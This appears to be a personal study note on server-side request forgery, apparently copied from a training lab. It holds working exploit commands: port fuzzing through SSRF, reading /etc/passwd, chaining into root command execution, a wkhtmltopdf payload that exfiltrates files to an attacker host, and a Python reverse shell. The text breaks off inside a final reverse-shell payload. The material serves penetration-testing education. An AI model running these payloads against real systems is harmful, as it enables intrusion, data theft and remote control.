# SSRF

Status: Erledigt
Tags: SSRF (../Tags/SSRF%2027f2c37daa298010b3fec208b52485c9.md), Open Redirect (../Tags/Open%20Redirect%2027f2c37daa29809f8952deb2c81c7faf.md), DNS (../Tags/DNS%2027f2c37daa29807caff0cd0cf802bfe9.md), Account Takeover (ATO) (../Tags/Account%20Takeover%20(ATO)%2027f2c37daa2980f4abc6c479151370af.md)
Tags 2: HTTP

[Webhook.site - Test, process and transform emails and HTTP requests](https://webhook.site/)

[Dashboard - requestrepo.com](https://requestrepo.com/)

[https://github.com/qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

- Details
    
    Server-Side Request Forgery (`SSRF`) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:
    
    - Interacting with known internal systems
    - Discovering internal services via port scans
    - Disclosing local/sensitive data
    - Including files in the target application
    - Leaking NetNTLM hashes using UNC Paths (Windows)
    - Achieving remote code execution
    
    We can usually find SSRF vulnerabilities in applications that fetch remote resources. When hunting for SSRF vulnerabilities, we should look for:
    
    - Parts of HTTP requests, including URLs
    - File imports such as HTML, PDFs, images, etc.
    - Remote server connections to fetch data
    - API specification imports
    - Dashboards including ping and similar functionalities to check server statuses
    
    **Note:** Always keep in mind that web application fuzzing should be part of any penetration testing or bug bounty hunting activity. That being said, fuzzing should not be limited to user input fields only. Extend fuzzing to parts of the HTTP request as well, such as the User-Agent.
    
    ---
    
    ### Nmap - Discovering Open Ports
    
    ```bash
    $ nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>
    
    Nmap scan report for <TARGET IP>
    Host is up (0.00047s latency).
    Not shown: 65532 filtered ports
    PORT    STATE  SERVICE
    22/tcp  open   ssh
    80/tcp  open   http
    8080/tcp open  http-proxy
    
    Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
    
    ```
    
    Let's issue a cURLrequest to the target server using the parameters `-i` to show the protocol response headers and `-s` to use the silent mode.
    
    ### Curl - Interacting with the Target
    
    ```bash
    $ curl -i -s http://<TARGET IP>
    
    HTTP/1.0 302 FOUND
    Content-Type: text/html; charset=utf-8
    Content-Length: 242
    Location: http://<TARGET IP>/load?q=index.html
    Server: Werkzeug/2.0.2 Python
    Date: Mon, 18 Oct 2021 09:01:02 GMT
    
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
    <title>Redirecting...</title>
    <h1>Redirecting...</h1>
    <p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.
    
    ```
    
    We can see the request redirected to `/load?q=index.html`, meaning the `q` parameter fetches the resource `index.html`. Let us follow the redirect to see if we can gather any additional information.
    
    ```bash
    $ curl -i -s -L http://<TARGET IP>
    
    HTTP/1.0 302 FOUND
    Content-Type: text/html; charset=utf-8
    Content-Length: 242
    Location: http://<TARGET IP>/load?q=index.html
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Mon, 18 Oct 2021 10:20:27 GMT
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 153
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Mon, 18 Oct 2021 10:20:27 GMT
    
    <html>
    <!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
    <body>
    <h1>Bad App</h1>
    <a>Hello World!</a>
    </body>
    </html>
    
    ```
    
    The spawned target is `ubuntu-web.lalaguna.local`, and `internal.app.local` is an application on the internal network (inaccessible from our current position).
    
    The next step is to confirm if the `q` parameter is vulnerable to SSRF. If it is, we may be able to reach the internal.app.local web application by leveraging the SSRF vulnerability. We say "may" because a trust relationship likely exists for `ubuntu-web` to be able to reach and interact with `internal.app.local`. This type of relationship can be something as simple as a firewall rule (or even a lack of any firewall rule).
    
    In one terminal, let's use Netcat to listen on port 8080, as follows.
    
    ### Netcat Listener
    
    ```bash
    $ nc -nvlp 8080
    
    listening on [any] 8080 ...
    
    ```
    
    Now, let us issue a request to the target web application with `http://<VPN/TUN Adapter IP>` instead of `index.html` in another terminal, as follows. `<VPN/TUN Adapter IP>` will either be the TUN adapter IP of Pwnbox or the TUN adapter IP of the local VM you may be using (after connecting with the supplied VPN key).
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 0
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Mon, 18 Oct 2021 12:07:10 GMT
    
    ```
    
    We will receive the following into our Netcat listener confirming the SSRF vulnerability via a request issued by the target server using [Python-urllib](https://docs.python.org/3.8/library/urllib.html)
    
    ### Netcat Listener - Confirming SSRF
    
    ```bash
    Connection received on <TARGET IP> 49852
    GET / HTTP/1.1
    Accept-Encoding: identity
    Host: <VPN/TUN Adapter IP>:8080
    User-Agent: Python-urllib/3.8
    Connection: close
    
    ```
    
    Reading the [Python-urllib](https://docs.python.org/3.8/library/urllib.html) documentation, we can see it supports `file`, `http` and `ftp` schemas. So, apart from issuing HTTP requests to other services on behalf of the target application, we can also read local files via the `file` schema and remote files using `ftp`.
    
    We can test this functionality through the steps below:
    
    1. Create a file called index.html
    
    ```html
    <html>
    </body>
    <a>SSRF</a>
    <body>
    <html>
    
    ```
    
    1. Inside the directory where index.html is located, start an HTTP server using the following command
    
    ### Start Python HTTP Server
    
    ```bash
    $ python3 -m http.server 9090
    
    ```
    
    1. Inside the directory where index.html is located, start an FTP Server via the following command
    
    ### Start FTP Server
    
    ```bash
    $ sudo pip3 install twisted
    $ sudo python3 -m twisted ftp -p 21 -r .
    
    ```
    
    1. Retrieve index.html through the target application using the `ftp` schema, as follows
    
    ### Retrieving a remote file through the target application - FTP Schema
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 41
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 11:21:09 GMT
    
    <html>
    </body>
    <a>SSRF</a>
    <body>
    <html>
    
    ```
    
    1. Retrieve index.html through the target application using the `http` schema, as follows
    
    ### Retrieving a remote file through the target application - HTTP Schema
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 41
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 11:26:18 GMT
    
    <html>
    </body>
    <a>SSRF</a>
    <body>
    <html>
    
    ```
    
    1. Retrieve a local file using the file schema, as follows
    
    ### Retrieving a local file through the target application - File Schema
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 926
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 11:27:17 GMT
    
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    
    ```
    
    Bear in mind that fetching remote HTML files can lead to Reflected XSS.
    
    Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications by performing the following steps:
    
    1. Generate a wordlist containing all possible ports.
    
    ### Generate a Wordlist
    
    ```bash
    $ for port in {1..65535};do echo $port >> ports.txt;done
    
    ```
    
    1. Issue a cURL request to a random port to get the response size of a request for a non-existent service.
    
    ### Curl - Interacting with the Target
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 30
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 11:36:25 GMT
    
    [Errno 111] Connection refused
    
    ```
    
    1. Use ffuf with the wordlist and discard the responses which have the size we previously identified.
    
    ### Port Fuzzing
    
    ```bash
    $ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
    
            /'___\\  /'___\\           /'___\\
           /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
           \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
            \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
             \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
              \\/_/    \\/_/   \\/___/    \\/_/
    
           v1.3.1 Kali Exclusive <3
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://<TARGET IP>/load?q=http://127.0.0.1:PORT
     :: Wordlist         : PORT: ./ports.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405
     :: Filter           : Response size: 30
    ________________________________________________
    
    80                      [Status: 200, Size: 153, Words: 11, Lines: 8]
    5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]
    :: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 ::
    
    ```
    
    We have received a valid response for port `5000`. Let us check it as follows.
    
    ### cURL - Interacting with the Target
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 64
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 11:47:16 GMT
    
    <html><body><h1>Hey!</h1><a>Some internal app!</a></body></html>
    
    ```
    
    Up to this point, we have learned how to reach internal applications and use different schemas to load local files through SSRF. Armed with this knowledge, let us try attacking the `internal.app.local` web application, again through SSRF. Our ultimate goal is to achieve remote code execution on an internal host.
    
    First, we issue a simple cURL request to the internal application we discovered previously. Remember the information we uncovered that both applications load resources in the same way (via the `q` parameter).
    
    ### cURL - Interacting with the Target
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 83
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 13:51:15 GMT
    
    <html>
    <body>
    <h1>Internal Web Application</h1>
    <a>Hello World!</a>
    </body>
    </html>
    
    ```
    
    Now, let us discover any web applications listening in localhost. Let us try to issue a request to a random port to identify how responses from closed ports look.
    
    ### cURL - Interacting with the Target
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 97
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 14:52:32 GMT
    
    <html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
    
    ```
    
    We have received an `unknown url type` error message. It seems the web application is removing `://` from our request. Let's try to overcome this situation by modifying the URL.
    
    ### cURL - Interacting with the Target
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 99
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 14:55:10 GMT
    
    <html><body><h1>Resource: <http://127.0.0.1:1></h1><a>[Errno 111] Connection refused</a></body></html>
    
    ```
    
    In this case, the web application returns some HTML rendered content containing the resource we are trying to fetch. This response will affect our internal service discovery if we use the size of the response as a filter as it will change depending on the port. Fortunately for us, ffuf supports regular expressions for filtering. We can use this ffuf feature to use the error number for filtering responses, as follows.
    
    ### Port Fuzzing
    
    ```bash
    $ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'
    
            /'___\\  /'___\\           /'___\\
           /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
           \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
            \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
             \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
              \\/_/    \\/_/   \\/___/    \\/_/
    
           v1.3.1 Kali Exclusive <3
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT
     :: Wordlist         : PORT: ./ports.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405
     :: Filter           : Regexp: Errno[[:blank:]]111
    ________________________________________________
    
    80                      [Status: 200, Size: 153, Words: 5, Lines: 6]
    5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]
    :: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::
    
    ```
    
    We have found another application listening on port 5000. In this case, the application responds with a list of files.
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 385
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 20:30:07 GMT
    
    <html><body><h1>Resource: <http://127.0.0.1:5000/></h1><a>total 24K
    drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
    drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
    -rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
    -rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
    -rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
    -rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
     </a></body></html>
    
    ```
    
    Let us make a quick recap of what we have achieved:
    
    - Issue requests on behalf of ubuntu-web to internal.app.local
    - Reach a web application listening on port 5000 inside internal.app.local chaining two SSRF vulnerabilities
    - Disclose a list of files via the internal application
    
    Let us now uncover the source code of the web applications listening on `internal.app.local` to see how we can achieve remote code execution.
    
    Let us issue a request to disclose `/proc/self/environ` file, where the current path should be present under the `PWD` environment variable.
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 584
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 16:52:20 GMT
    
    <html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3</a></body></html>
    
    ```
    
    Now we know that the current path is `/app`, and we have a list of interesting files. Let's disclose the `internal_local.py` file as follows.
    
    ### Retrieving a local file through the target application - File Schema
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 771
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 20:40:28 GMT
    
    <html><body><h1>Resource: file:///app/internal_local.py</h1><a>import os
    from flask import *
    import urllib
    import subprocess
    
    basedir = os.path.abspath(os.path.dirname(__file__))
    
    app = Flask(__name__)
    
    def run_command(command):
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = p.stdout.read()
        stderr = p.stderr.read()
        result = stdout.decode() + " " + stderr.decode()
        return result
    
    @app.route("/")
    def index():
        return run_command("ls -lha")
    
    @app.route("/runme")
    def runmewithargs():
        command = request.args.get("x")
        if command == "":
            return "Use /runme?x=<CMD>"
        return run_command(command)
    
    if __name__ == "__main__":
        app.run(host="127.0.0.1", port=5000)
    </a></body></html>
    
    ```
    
    By studying the source code above, we notice a functionality that allows us to execute commands on the remote host sending a GET request to`/runme?x=<CMD>`. Let us confirm remote code execution by sending `whoami` as a command.
    
    ```bash
    ]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
    
    HTTP/1.0 200 OK
    Content-Type: text/html; charset=utf-8
    Content-Length: 93
    Server: Werkzeug/2.0.2 Python/3.8.12
    Date: Tue, 19 Oct 2021 20:48:32 GMT
    
    <html><body><h1>Resource: <http://127.0.0.1:5000/runme?x=whoami></h1><a>root
     </a></body></html>
    
    ```
    
    We can execute commands under the superuser context on the target application. But what happens if we try to submit a command with arguments, such as the below?
    
    ```bash
    $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"
    
    HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')
    Connection: close
    Content-Type: text/html;charset=utf-8
    Content-Length: 586
    
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
            "<http://www.w3.org/TR/html4/strict.dtd>">
    <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
            <title>Error response</title>
        </head>
        <body>
            <h1>Error response</h1>
            <p>Error code: 400</p>
            <p>Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').</p>
            <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
        </body>
    </html>
    
    ```
    
    To execute commands with arguments or special characters, we need to encode them three times as we pass them through three different web applications.
    
    For doing so, you can use any online URL-encoding service such as [urlencoder.org](https://www.urlencoder.org/). A quick way to achieve this from the terminal also exists. This is to use `jq`, which supports encoding as follows:
    
    ```bash
    $ echo "encode me" | jq -sRr @uri
    encode%20me%0A
    
    ```
    
    ### Automate executing commands
    
    ```bash
    ]$ function rce() {
    function> while true; do
    function while> echo -n "# "; read cmd
    function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
    function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
    function while> echo ""
    function while> done
    function> }
    
    ```
    
    ```bash
    $ rce
    # uname -a; hostname; whoami
    
    <html><body><h1>Resource: <http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami>
    </h1><a>Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux
    a054d48cc0a4
    root
     </a></body></html>
    
    ```
    
    ---
    
    ## Blind SSRF
    
    Server-Side Request Forgery vulnerabilities can be "blind." In these cases, even though the request is processed, we can't see the backend server's response. For this reason, blind SSRF vulnerabilities are more difficult to detect and exploit.
    
    We can detect blind SSRF vulnerabilities via out-of-band techniques, making the server issue a request to an external service under our control. To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:
    
    - [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) (Part of Burp Suite professional. Not Available in the community edition)
    - [http://pingb.in](http://pingb.in/)
    
    Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.
    
    If we upload various HTML files and inspect the responses, we will notice that the application returns the same response regardless of the structure and content of the submitted files. In addition, we cannot observe any response related to the processing of the submitted HTML file on the front end. Should we conclude that the application is not vulnerable to SSRF? Of course not! We should be thorough during penetration tests and look for the blind counterparts of different vulnerability classes.
    
    Let us create an HTML file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability. This service can be a web server hosted in a machine we own, Burp Collaborator, a [Pingb.in](http://pingb.in/) URL etc. Please note that the protocols we can use when utilizing out-of-band techniques include HTTP, DNS, FTP, etc.
    
    ```html
    <!DOCTYPE html>
    <html>
    <body>
    	<a>Hello World!</a>
    	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
    </body>
    </html>
    
    ```
    
    For the sake of simplicity, the service we will use to test for a blind SSRF vulnerability will be a simple Netcat listener running in Pwnbox or a local VM and listening on port 9090. If you are using a local VM, remember to use the supplied VPN key. So, on the above HTML file, `SERVICE IP` should be the `VPN/TUN IP` of Pwnbox or your local VM, and `PORT` should be `9090`.
    
    ```bash
    $ sudo nc -nlvp 9090
    
    Listening on 0.0.0.0 9090
    
    ```
    
    After submitting the file, we will receive a message from the web application in the browser and a request to our server revealing the application used to convert the HTML document to PDF.
    
    By inspecting the request, we notice `wkhtmltopdf` in the User-Agent. If we browse [wkhtmltopdf's downloads webpage](https://wkhtmltopdf.org/downloads.html), the below statement catches our attention:
    
    `Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.`
    
    Great, we can execute JavaScript in wkhtmltopdf! Let us leverage this functionality to read a local file by creating the following HTML document.
    
    ```html
    <html>
        <body>
            <b>Exfiltration via Blind SSRF</b>
            <script>
            var readfile = new XMLHttpRequest(); // Read the local file
            var exfil = new XMLHttpRequest(); // Send the file to our server
            readfile.open("GET","file:///etc/passwd", true);
            readfile.send();
            readfile.onload = function() {
                if (readfile.readyState === 4) {
                    var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                    exfil.open("GET", url, true);
                    exfil.send();
                }
            }
            readfile.onerror = function(){document.write('<a>Oops!</a>');}
            </script>
         </body>
    </html>
    
    ```
    
    In this case, we are using two [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) objects, one for reading the local file and another one to send it to our server. Also, we are using the `btoa` function to send the data encoded in Base64.
    
    Let us start an HTTP Server, submit the new HTML file, wait for the response, and decode its contents once the HTML file is processed, as follows.
    
    ```bash
    $ sudo nc -nlvp 9090
    
    Listening on 0.0.0.0 9090
    GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1
    Origin: file://
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
    Accept: */*
    Connection: Keep-Alive
    Accept-Encoding: gzip
    Accept-Language: en,*
    Host: 10.10.14.221:9090
    
    ```
    
    ```bash
    $ echo """cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>""" | base64 -d
    
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    
    ```
    
    In the previous section, we exploited an internal application through SSRF and executed remote commands on the target server. The same internal application (`internal.app.local`) exists in the current scenario. Let us compromise the underlying server, but this time by creating an HTML document with a valid payload for exploiting the local application listening on internal.app.local.
    
    We will use the following reverse shell payload (it is pretty easy to identify that Python is installed once you achieve remote code execution).
    
    ### Bash Reverse Shell
    
    ```bash
    export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    
    ```
    
    ```html
    export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
    
    ```
    
    ```html
    <html>
        <body>
            <b>Reverse Shell via Blind SSRF</b>
            <script>
            var http = new XMLHttpRequest();
